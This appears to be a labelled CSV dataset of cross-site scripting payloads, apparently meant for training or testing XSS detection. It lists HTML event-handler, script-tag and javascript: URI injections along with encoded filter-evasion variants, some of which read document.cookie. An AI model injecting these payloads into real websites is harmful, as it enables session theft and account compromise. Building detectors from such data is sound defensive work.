payload,context,technique,severity,length,source
"<style>:target {color: red;}</style><font id=x style=""transition:color 10s"" ontransitioncancel=print()></font>",event_handler,none,low,110,real
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></fieldset>",event_handler,none,medium,120,real
"""><svg onmouseenter=alert(location.hash)>",tag_injection,synthetic,medium,41,synthetic
"<title onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</title>",event_handler,none,medium,72,real
"<sup oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
%3Csvg ontoggle=prompt(location.hash)%3E,tag_injection,synthetic,medium,40,synthetic
"<menu onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></menu>",event_handler,none,medium,281,real
javascript:var a=document.createElement('a');a.href='javascript:alert(1)';document.body.appendChild(a),js_uri,none,medium,102,real
<acronym onpointerout=alert(1) style=display:block>AnonKryptiQuz</acronym>,event_handler,none,medium,74,real
<video controls ondurationchange=alert(1)><source src=validvideo.mp4 type=video/mp4></video>,event_handler,none,medium,92,real
"<textarea draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</textarea>",event_handler,none,medium,94,real
"""'><img src=xxx:x \x2Fonerror=javascript:alert(2873)>",event_handler,none,medium,53,real
"<dd onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dd>",event_handler,none,medium,277,real
<content onpointerdown=alert(1) style=display:block>AnonKryptiQuz</content>,event_handler,none,medium,75,real
"<th onmousedown=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,45,real
"<kbd onclick=""alert(1)"" style=display:block>AnonKryptiQuz</kbd>",event_handler,none,medium,63,real
"<main onclick=""alert(1)"" style=display:block>AnonKryptiQuz</main>",event_handler,none,medium,65,real
"<tt onmouseover=""alert(1)"">AnonKryptiQuz</tt>",event_handler,none,medium,45,real
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",script_injection,encoding,medium,79,real
' onbegin=console.log(1) ',attribute_escape,synthetic,medium,26,synthetic
<title onpropertychange=javascript:alert(1)></title><title title=>,event_handler,none,medium,66,real
%3Cscript%3Econfirm`document.cookie`%3C/script%3E,script_injection,synthetic,medium,49,synthetic
abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e,generic,url_encoding,low,81,real
"JavAscRipT:vOid(coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)))",js_uri,synthetic,medium,59,synthetic
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>,event_handler,none,medium,69,real
<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>,event_handler,none,medium,76,real
"<ol onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</ol>",event_handler,none,medium,77,real
%22 ontoggle=confirm(location.hash) %22,attribute_escape,synthetic,medium,39,synthetic
"&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",generic,html_entity,low,177,real
<svg onerror=console.log(location.hash)/>,tag_injection,synthetic,medium,41,synthetic
<script>/x/prompt(document.domain)</script>,script_injection,synthetic,medium,43,synthetic
' onerror=prompt(document.domain) ',attribute_escape,synthetic,medium,35,synthetic
"<label onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</label>",event_handler,none,medium,68,real
%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,generic,url_encoding,low,44,real
"""><svg onbegin=confirm(document.domain)>",tag_injection,synthetic,medium,40,synthetic
"<style>@keyframes slidein {}</style><li style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></li>",event_handler,none,medium,164,real
"<keygen onclick=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",event_handler,none,medium,69,real
"<svg onerror=\u0061lert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,55,synthetic
"<frameset draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",event_handler,none,medium,92,real
"<b draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</b>",event_handler,none,medium,60,real
%22><svg ontoggle=prompt(location.hash)>,tag_injection,synthetic,medium,40,synthetic
"<section id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></section>",event_handler,none,medium,90,real
"<div draggable=""true"" contenteditable>drag me</div><image2 ondrop=alert(1) contenteditable style=display:block>drop here</image2>",event_handler,none,medium,129,real
<thead onfocusout=alert(1) tabindex=1 id=x></thead><input autofocus>,event_handler,none,medium,68,real
"<img src\x10=x onerror=""javascript:alert(3539)"">",event_handler,none,medium,48,real
%22 onmouseover=alert(1) %22,attribute_escape,synthetic,medium,28,synthetic
%22><svg onmouseover=confirm(%27XSS%27)>,tag_injection,synthetic,medium,40,synthetic
<listing onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</listing><input value=clickme>,event_handler,none,medium,105,real
"<select oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<dir draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,64,real
"<style>@keyframes x{}</style><image2 style=""animation-name:x"" onwebkitanimationend=""alert(1)""></image2>",event_handler,none,medium,103,real
/><svg src=x onload=confirm(document.domain);>,event_handler,none,medium,46,real
' oNbeGin=coNsoLe.Log(doCumEnt.doMaiN) ',attribute_escape,synthetic,medium,40,synthetic
"%3F%20<body onload=alert(""AnonKryptiQuz"")>",event_handler,url_encoding,medium,42,real
"<link onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,84,real
<thead onpointerover=alert(1) style=display:block>AnonKryptiQuz</thead>,event_handler,none,medium,71,real
&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;,generic,html_entity,low,191,real
<ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>,event_handler,none,medium,58,real
<button popovertarget=x>Click me</button><animatemotion ontoggle=alert(1) popover id=x>AnonKryptiQuz</animatemotion>,event_handler,none,medium,116,real
<svg onb&#101;gin=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,50,synthetic
<svG oNmoUseOveR=cOnfIrm(loCatIon.haSh)/>,tag_injection,synthetic,medium,41,synthetic
"<style>:target {color:red;}</style><rb id=x style=""transition:color 1s"" ontransitionend=alert(1)></rb>",event_handler,none,medium,102,real
"<noembed onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,75,real
%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e,generic,url_encoding,low,348,real
"<html onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</html>",event_handler,none,medium,61,real
"""><img src=x onerror=javascript:alert(A)>",event_handler,none,medium,41,real
<svg onauxclick='a=alert;b=document;a(b.domain)'>,event_handler,none,low,49,real
"<script>/x/confirm(String.fromCharCode(88,83,83))</script>",script_injection,synthetic,medium,58,synthetic
"<style>@keyframes slidein {}</style><aside style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></aside>",event_handler,none,medium,164,real
"<del onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</del>",event_handler,none,medium,62,real
"\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="""" alt=\'",script_injection,encoding|case_variation,medium,74,real
<input4 onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<style>:target {color:red;}</style><image2 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></image2>",event_handler,none,medium,112,real
¼script¾alert(¢AnonKryptiQuz¢)¼/script¾,generic,none,medium,39,real
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe,generic,html_entity,low,107,real
"<svg onmouseover=prompt(String.fromCharCode(88,83,83))/>",tag_injection,synthetic,medium,56,synthetic
<svg onmouseover=console.log(%27XSS%27)>,tag_injection,synthetic,medium,40,synthetic
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,event_handler,none,medium,66,real
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>,event_handler,none,medium,57,real
"<menuitem onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</menuitem>",event_handler,none,medium,89,real
"<style>@keyframes slidein {}</style><wbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></wbr>",event_handler,none,medium,160,real
<svg onmouseover=\u0061lert(document.cookie)/>,tag_injection,synthetic,medium,46,synthetic
"<style>@keyframes slidein {}</style><slot style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></slot>",event_handler,none,medium,162,real
"<ul oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,95,real
"<output onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</output>",event_handler,none,medium,71,real
""">Enter_Mouse_Pointer_Here_to_get_AnonKryptiQuz<P/onpointerenter=""alert(1)""><<""",event_handler,case_variation,medium,79,real
"<template oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,102,real
<iframe onpointermove=alert(1) style=display:block>AnonKryptiQuz</iframe>,event_handler,none,medium,73,real
""" onfocus=alert(1) """,attribute_escape,synthetic,medium,20,synthetic
"<style>:target {color: red;}</style><footer id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></footer>",event_handler,none,medium,115,real
<svg onfocus=alert(%27XSS%27)/>,tag_injection,synthetic,medium,31,synthetic
"<video id=x controls onfocus=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",event_handler,none,medium,90,real
"""><svg onmouseenter=\u0061lert(1)>",tag_injection,synthetic,medium,34,synthetic
"<th draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</th>",event_handler,none,medium,57,real
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable style=display:block>drop here</image>",event_handler,none,medium,131,real
%22 onerror=prompt(1) %22,attribute_escape,synthetic,medium,25,synthetic
%22 onfocus=alert(document.cookie) autofocus=%22,attribute_escape,synthetic,medium,48,synthetic
<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,event_handler,none,medium,66,real
""" oNfoCus=alErt(doCumEnt.coOkiE) AutOfoCus=""",attribute_escape,synthetic,medium,44,synthetic
<!--><svg onload=alert(1)-->.php,event_handler,comment_injection,medium,32,real
<data onblur=alert(1) tabindex=1 id=x></data><input autofocus>,event_handler,none,medium,62,real
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,event_handler,none,medium,68,real
"<optgroup ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</optgroup>",event_handler,none,medium,97,real
"<animatetransform onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</animatetransform>",event_handler,none,medium,93,real
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,75,synthetic
<IMG SRC=`javascript:javascript:alert(1)`>,js_uri,case_variation,medium,42,real
"<IMG SRC=x onprogress=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,61,real
<ol id=x tabindex=1 onactivate=alert(1)></ol>,event_handler,none,medium,45,real
<slot onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
"<title onmouseleave=""alert(1)"">AnonKryptiQuz</title>",event_handler,none,medium,52,real
"<canvas onclick=""alert(1)"">AnonKryptiQuz</canvas>",event_handler,none,medium,49,real
"<<SCRIPT>alert(""AnonKryptiQuz"");//<</SCRIPT>",script_injection,case_variation,medium,44,real
<param onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
<svg onclick=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection,synthetic,medium,54,synthetic
<svg onload=alert&#0000000040document.cookie)>,event_handler,html_entity,high,46,real
<svg onmouseenter=alert(1)/>,tag_injection,synthetic,medium,28,synthetic
"""><svg onclick=confirm(document.cookie)>",tag_injection,synthetic,medium,40,synthetic
' oNerRor=coNfiRm(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,34,synthetic
<content id=x tabindex=1 onbeforeactivate=alert(1)></content>,event_handler,none,medium,61,real
"<var oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"<style>@keyframes slidein {}</style><dfn style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></dfn>",event_handler,none,medium,166,real
"<style>@keyframes slidein {}</style><tbody style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tbody>",event_handler,none,medium,164,real
javascript:%ef%bb%bfalert(AnonKryptiQuz),js_uri,url_encoding,medium,40,real
"<s onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</s>",event_handler,none,medium,61,real
""" onlo&#97;d=prompt('XSS') """,attribute_escape,synthetic,medium,28,synthetic
"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",event_handler,none,medium,117,real
""" onmouseenter=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,58,synthetic
<svG oNloAd=ProMpt(loCatIon.haSh)>,tag_injection,synthetic,medium,34,synthetic
"<kbd draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</kbd>",event_handler,none,medium,62,real
secbreake@gmail.com\u003C/script\u003E\u003Cscript\u003Ealert(document.domain)//,dom_sink,unicode_escape,medium,80,real
"<ul draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</ul>",event_handler,none,medium,80,real
""" oNbeGin=alErt(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,34,synthetic
' onload=alert('XSS') ',attribute_escape,synthetic,medium,23,synthetic
%22><svg onfocus=prompt(document.cookie)>,tag_injection,synthetic,medium,41,synthetic
<button popovertarget=x>Click me</button><blink ontoggle=alert(1) popover id=x>AnonKryptiQuz</blink>,event_handler,none,medium,100,real
<font contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,58,real
"<applet draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</applet>",event_handler,none,medium,65,real
"<style>:target {color:red;}</style><content id=x style=""transition:color 1s"" ontransitionend=alert(1)></content>",event_handler,none,medium,112,real
<pre onpointermove=alert(1) style=display:block>AnonKryptiQuz</pre>,event_handler,none,medium,67,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><plaintext id=x style=""position:absolute;"" onanimationcancel=""print()""></plaintext>",event_handler,none,low,187,real
%3Cscript%3Ealert(1)%3C/script%3E##1,generic,url_encoding,medium,36,real
"<address onmousedown=""alert(1)"">AnonKryptiQuz</address>",event_handler,none,medium,55,real
"<style>:target {transform: rotate(180deg);}</style><section id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></section>",event_handler,none,medium,132,real
"<figure onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",event_handler,none,medium,65,real
"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#",script_injection,none,medium,448,real
"<div draggable=""true"" contenteditable>drag me</div><cite ondragover=alert(1) contenteditable>drop here</cite>",event_handler,none,medium,109,real
"<hr onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,66,real
"<img onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</img>",event_handler,none,medium,68,real
"<map onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</map>",event_handler,none,medium,67,real
<details onpointerover=alert(1) style=display:block>AnonKryptiQuz</details>,event_handler,none,medium,75,real
"<style>:target {color:red;}</style><tfoot id=x style=""transition:color 1s"" ontransitionend=alert(1)></tfoot>",event_handler,none,medium,108,real
"""oncut=alert(1)",event_handler,none,medium,15,real
"<marquee onmousemove=""alert(1)"">AnonKryptiQuz</marquee>",event_handler,none,medium,55,real
"<BR SIZE=""&{javascript:alert(2447)}"">",js_uri,case_variation,medium,37,real
"<bgsound onmousedown=""alert(1)"">AnonKryptiQuz</bgsound>",event_handler,none,medium,55,real
<progress onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"<output draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</output>",event_handler,none,medium,88,real
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>,event_handler,none,medium,71,real
"<footer draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</footer>",event_handler,none,medium,68,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><s id=x style=""position:absolute;"" onanimationcancel=""print()""></s>",event_handler,none,low,171,real
<aside onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</aside><input value=clickme>,event_handler,none,medium,110,real
"<img src=x onerror=""js:abc='al'+'ert()';eval(abc)"" />",event_handler,encoding,high,53,real
"""`'><script>\xE1\xA0\x8Ejavascript:alert(6168)</script>",script_injection,none,medium,55,real
"<command onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</command>",event_handler,none,medium,75,real
"<pre onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</pre>",event_handler,none,medium,64,real
<svg ontoggle=alert(document.cookie)>,tag_injection,synthetic,medium,37,synthetic
<scr	ipt>prompt`document.domain`</scr	ipt>,script_injection,synthetic,medium,42,synthetic
"<thead onmouseleave=""alert(1)"">AnonKryptiQuz</thead>",event_handler,none,medium,52,real
http://www.google<script .com>alert(document.location)</script,script_injection,none,medium,62,real
<tbody onfocusout=alert(1) tabindex=1 id=x></tbody><input autofocus>,event_handler,none,medium,68,real
<picture onpointerup=alert(1) style=display:block>AnonKryptiQuz</picture>,event_handler,none,medium,73,real
<svg onx=() onload=(confirm)(1)>,event_handler,none,low,32,real
'te' + alert('+') + 'xt';,generic,none,medium,25,real
"%22><svg onmouseover=alert(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,58,synthetic
"%3Csvg onbegin=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,60,synthetic
"javascript:alert()//""/*`/*'/*\""/*--></title></textarea></noscript></noembed></template></style></script>*/ alert()//<frame onload=alert()><<script>alert()<</script>",script_injection,comment_injection,medium,164,real
"<dl draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</dl>",event_handler,none,medium,62,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></rt>",event_handler,none,medium,174,real
<svg onclick=prompt('XSS')>,tag_injection,synthetic,medium,27,synthetic
"<track onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</track>",event_handler,none,medium,72,real
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->,event_handler,comment_injection,medium,55,real
<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>,event_handler,none,medium,66,real
"<map onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</map>",event_handler,none,medium,67,real
<strike id=x tabindex=1 onactivate=alert(1)></strike>,event_handler,none,medium,53,real
"""><Svg onMouSeoVer=alErt(1)>",tag_injection,synthetic,medium,28,synthetic
"<meta oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</meta>",event_handler,none,medium,71,real
<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>,event_handler,encoding,low,79,real
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,dom_sink,url_encoding,low,81,real
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=print()></picture>",event_handler,none,low,131,real
"<code draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</code>",event_handler,none,medium,86,real
<svg onlo&#97;d=prompt(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,50,synthetic
"<IMG SRC=x onblur=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,57,real
"' onbegin=confirm(String.fromCharCode(88,83,83)) '",attribute_escape,synthetic,medium,50,synthetic
"<style>:target {transform: rotate(180deg);}</style><section id=x style=""transition:transform 2s"" ontransitionrun=print()></section>",event_handler,none,low,131,real
"<style>:target {color:red;}</style><input3 id=x style=""transition:color 1s"" ontransitionstart=alert(1)></input3>",event_handler,none,medium,112,real
"<b oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</b>",event_handler,none,medium,65,real
""" onbegin=\u0061lert('XSS') """,attribute_escape,synthetic,medium,29,synthetic
<img onlo&#97;d=prompt(1)>,tag_injection,synthetic,medium,26,synthetic
"<center onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</center>",event_handler,none,medium,87,real
autofocus ' onfocus='alert(document.domain)',event_handler,none,medium,44,real
"%22><svg onbegin=console.log(String.fromCharCode(88,83,83))>",tag_injection,synthetic,medium,60,synthetic
%2522%253E%253Cimg%2520src%253Dx%2520onerror%253Dprompt%2528document.cookie%2529%253B%253E,dom_sink,url_encoding,high,90,real
<video onpointerup=alert(1) style=display:block>AnonKryptiQuz</video>,event_handler,none,medium,69,real
' oNerRor=coNsoLe.Log('XSS') ',attribute_escape,synthetic,medium,30,synthetic
<aside onpointerleave=alert(1) style=display:block>AnonKryptiQuz</aside>,event_handler,none,medium,72,real
"<style>@keyframes x{}</style><xmp style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></xmp>",event_handler,none,medium,99,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dl>",event_handler,none,medium,174,real
<image onpointerleave=alert(1) style=display:block>AnonKryptiQuz</image>,event_handler,none,medium,72,real
"<ruby draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</ruby>",event_handler,none,medium,85,real
"<ul oncontextmenu=""alert(1)"">AnonKryptiQuz</ul>",event_handler,none,medium,47,real
<svg ontoggle=alert(1)>,tag_injection,synthetic,medium,23,synthetic
"<menu onmouseover=""alert(1)"">AnonKryptiQuz</menu>",event_handler,none,medium,49,real
"<style>@keyframes x{}</style><video style=""animation-name:x"" onwebkitanimationend=""alert(1)""></video>",event_handler,none,medium,101,real
"%3Csvg onload=alert(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,medium,54,synthetic
<svg/onload=eval(atob(‘YWxlcnQoZG9jdW1lbnQuY29va2llKQ==’))>,event_handler,encoding,high,59,real
